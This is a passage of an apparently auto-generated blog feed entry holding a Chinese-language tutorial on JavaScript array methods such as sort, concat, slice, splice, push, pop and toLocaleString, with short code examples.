class="params">a,b</span>)</span>&#123;<span class="keyword">return</span> a - b&#125;);  <span class="comment">//若a &lt; b 则为正序排列</span></span><br></pre></td></tr></table></figure><p>一般而言字符串的排序区分大小写，大写在前，小写在后；</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'Aff'</span>, <span class="string">'a'</span>, <span class="string">'B'</span>].sort() <span class="comment">// =&gt; ["Aff", "B", "a"]</span></span><br></pre></td></tr></table></figure><p>如果不需要区分大小写，则需用将数组里面的元素都转换为小写字符串（使用方法toLowerCase()），然后进行比较；</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'Aff'</span>, <span class="string">'a'</span>, <span class="string">'B'</span>].sort(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a1 = a.toLowerCase(),</span><br><span class="line">    b1 = b.toLowerCase();</span><br><span class="line">  <span class="keyword">if</span>(a1 &lt; b1) &#123;<span class="keyword">return</span> <span class="number">-1</span>&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// = &gt; ["Aff", "a", "B"]</span></span><br></pre></td></tr></table></figure><h4 id="4-concat"><a href="#4-concat" class="headerlink" title="4. concat()"></a>4. concat()</h4><p>该方法用于连接两个或者多个数组，注意：该方法不会改变数组，只会返回被连接数组的副本；</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].concat([<span class="number">4</span>,<span class="number">5</span>]) <span class="comment">// =&gt; [1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure><p>该方法返回的数组的元素中包含原始数组和concat方法里面的每一个参数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].concat(<span class="number">4</span>, <span class="number">5</span>) <span class="comment">// =&gt; [1, 2, 3, 4, 5]</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].concat(<span class="number">4</span>, [<span class="number">5</span>]) <span class="comment">// =&gt; [1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure><h4 id="5-slice"><a href="#5-slice" class="headerlink" title="5. slice()"></a>5. slice()</h4><p>该方法返回数组的指定片段；如果有两个参数， 则参数分别表示指定片段的开始和结尾位置；</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].slice(<span class="number">2</span>,<span class="number">3</span>) <span class="comment">// =&gt;  [3]</span></span><br></pre></td></tr></table></figure><p>如果只有一个参数，则返回指定的索引到数组结束位置的片段</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].slice(<span class="number">2</span>) <span class="comment">// =&gt; [3, 4, 5]</span></span><br></pre></td></tr></table></figure><p>如果参数中出现负数，则从数组的最末尾元素开始计数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].slice(<span class="number">-2</span>) <span class="comment">// =&gt; [4, 5]</span></span><br></pre></td></tr></table></figure><h4 id="6-splice"><a href="#6-splice" class="headerlink" title="6.splice()"></a>6.splice()</h4><p>该方法通常用于向数组中插入或者删除元素（splice会修改被调用的原数组，创建出新的数组）</p><p>语法如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array.splice(start);</span><br><span class="line">array.splice(start, howmany);</span><br><span class="line">array.splice(start, howmany, item1, item2, ...);</span><br></pre></td></tr></table></figure><p>参数：</p><p>​    <strong>start</strong>  指定开始删除的位置，若超过数组长度，则从末尾进行操作；如果start为负数，则从数组末尾-start位开始操作，当方法中只使用这一个参数，则表是删除[start, end]元素；</p><p>​    <strong>howmany</strong>  表示要删除元素的个数；howmany 如果为零，则不删除元素；howmany 如果大于start后面元素的个数，则start后面所有元素都会被删除；</p><p>​    <strong>item1, item2 …</strong>  从start位置开始添加的元素</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">a.splice(<span class="number">3</span>) <span class="comment">// =&gt; 被删除的元素是[4, 5]</span></span><br><span class="line"><span class="comment">// =&gt; a 数组变为 [1, 2, 3]</span></span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">b.splice(<span class="number">3</span>, <span class="number">1</span>) <span class="comment">// =&gt; 表示从数组索引为3的位置开始删除，删除1个元素  被删除的元素是[4]</span></span><br><span class="line">   <span class="comment">// =&gt; b 数组变为  [1, 2, 3, 5]</span></span><br><span class="line"><span class="keyword">var</span> c = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">c.splice(<span class="number">2</span>, <span class="number">2</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>) <span class="comment">// =&gt; 表示删除索引在2开始的两个元素（即[3, 4]），然后添加后面的元素</span></span><br><span class="line"><span class="comment">//c 数组变为[1, 2, "a", "b", "c", 5]</span></span><br></pre></td></tr></table></figure><h4 id="7-push-amp-pop"><a href="#7-push-amp-pop" class="headerlink" title="7.push() &amp; pop()"></a>7.push() &amp; pop()</h4><p>这俩方法没啥讲的，分别从数组的末尾添加或者删除元素，这两个方法都会改变原数组；</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">a.push(<span class="number">6</span>,<span class="number">7</span>)    <span class="comment">//a =&gt;  [1, 2, 3, 4, 5, 6, 7];</span></span><br><span class="line">a.pop()   <span class="comment">//a =&gt;   [1, 2, 3, 4, 5, 6]</span></span><br></pre></td></tr></table></figure><h4 id="8-unshift-amp-shift"><a href="#8-unshift-amp-shift" class="headerlink" title="8.unshift() &amp; shift()"></a>8.unshift() &amp; shift()</h4><p>和上述方法类似，分别从数组的头部添加或者删除一个元素；改变原数组；</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">a.unshift(<span class="number">0</span>)  <span class="comment">// a =&gt; [0, 1, 2, 3, 4, 5]</span></span><br><span class="line">a.shift()     <span class="comment">// a =&gt; [1, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure><h4 id="9-toString-amp-toLocaleString"><a href="#9-toString-amp-toLocaleString" class="headerlink" title="9.toString &amp; toLocaleString()"></a>9.toString &amp; toLocaleString()</h4><p>这两个方法在针对数组的时候区别不大，根据《JavaScript权威指南》上的介绍，toString() 将数组的每个元素转换为字符串，并且输出用逗号分隔的字符串列表；输出不包括方括号或者任意形式的包裹数组值的分隔符；toLocaleString()使用本地化（和自定义实现的）分隔符将这些字符串连接起来，并且形成最终的字符串；</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].toString()   <span class="comment">// =&gt; "1,2,3"</span></span><br><span class="line">[<span class="number">1</span>, [<span class="number">2</span>], [<span class="number">3</span>, [<span class="number">4</span>]]].toString() <span class="comment">// =&gt; "1,2,3,4"</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].toLocaleString()   <span class="comment">// =&gt; "1,2,3"</span></span><br></pre></td></tr></table></figure><p>如上demo所示，两者针对数组的的效果几乎一样，但是当针对数字和时间格式的时候差别就比较明显了；</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数字</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">123</span>;</span><br><span class="line">a.toString() <span class="comment">// =&gt; "123"</span></span><br><span class="line">a.toLocaleString() <span class="comment">// =&gt; "123"</span></span><br><span class="line"><span class="keyword">var</span> b = <span class="number">1234</span>;</span><br><span class="line">b.toString() <span class="comment">// =&gt; "1234"</span></span><br><span class="line">b.toLocaleString() <span class="comment">// =&gt; "1,234"</span></span><br><span class="line"><span class="comment">//时间</span></span><br><span class="line"><span class="keyword">var</span> time = <span class="keyword">new</span> <span class="built_in">Date</span>()</span><br><span class="line"><span class="comment">// time =&gt; Thu Dec 28 2017 21:15:44 GMT+0800 (中国标准时间)</span></span><br><span class="line">time.toString() <span class="comment">// =&gt; "Thu Dec 28 2017 21:15:44 GMT+0800 (中国标准时间)"</span></span><br><span class="line">time.toLocaleString() <span class="comment">// =&gt; "2017/12/28 下午9:15:44"</span></span><br></pre></td></tr></table></figure><p>以上就是两种方法的微妙区别了，欢迎查漏补缺！</p><h4 id="总结语"><a href="#总结语" class="headerlink" title="总结语"></a>总结语</h4><p>以上介绍了数组的部分方法，虽然比较简单，但是很基础，愚以为基础乃基石也，不可不巩固！！！</p><p>下一篇博客将会总结ES5里的内容，嗯 ~ 今天就到这里吧！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h4&gt;&lt;p&gt;​    时光如白驹过隙，2017已进入尾声。受很多前端前辈的影响，我的个人博客也在年末搭建了下来，希望自己可以好好坚持，砥砺前行，
      
    
    </summary>
    
      <category term="JavaScript" scheme="http://yoursite.com/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="http://yoursite.com/tags/JavaScript/"/>
    
  </entry>
  
</feed>
